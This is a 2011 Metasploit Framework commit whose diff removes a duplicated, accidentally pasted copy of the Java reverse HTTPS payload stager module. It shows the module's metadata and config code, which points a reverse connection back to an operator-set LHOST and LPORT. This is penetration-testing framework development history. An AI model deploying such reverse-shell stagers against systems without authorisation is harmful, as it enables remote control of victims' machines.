7e4826bae440fcd7ff0f1ad7cbd390e49d71180e
James Lee <James_Lee@rapid7.com>
2011-09-16 21:11:57 +0000

    silly patch fail
    git-svn-id: file:///home/svn/framework3/trunk@13742 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/payloads/stagers/java/reverse_https.rb
+++ modules/payloads/stagers/java/reverse_https.rb
@@ -53,74 +53,7 @@ module Metasploit3
 		c << "URL=https://#{datastore["LHOST"]}"
 		c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
 		c << "/INITJM\n"
-		
-		c
-	end
 
-	#
-	# Always wait at least 20 seconds for this payload (due to staging delays)
-	#
-	def wfs_delay
-		20
-	end
-end
-
-##
-# $Id$
-##
-
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
-
-require 'msf/core'
-require 'msf/core/handler/reverse_https'
-
-module Metasploit3
-
-	include Msf::Payload::Stager
-	include Msf::Payload::Java
-
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Java Reverse HTTPS Stager',
-			'Version'       => '$Revision: 13402 $',
-			'Description'   => 'Tunnel communication over HTTPS',
-			'Author'        => [
-					'mihi',  # all the hard work
-					'egypt', # msf integration
-					'hdm',   # windows/reverse_https
-				],
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'java',
-			'Arch'          => ARCH_JAVA,
-			'Handler'       => Msf::Handler::ReverseHttps,
-			'Convention'    => 'javaurl',
-			'Stager'        => {'Payload' => ""}
-			))
-
-		register_advanced_options(
-			[
-				Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
-			], self.class
-		)
-
-		@class_files = [
-			[ "metasploit", "PayloadTrustManager.class" ],
-		]
-	end
-
-	def config
-		spawn = datastore["Spawn"] || 2
-		c =  ""
-		c << "Spawn=#{spawn}\n"
-		c << "URL=https://#{datastore["LHOST"]}"
-		c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-		c << "/INITJM\n"
-		
 		c
 	end
 
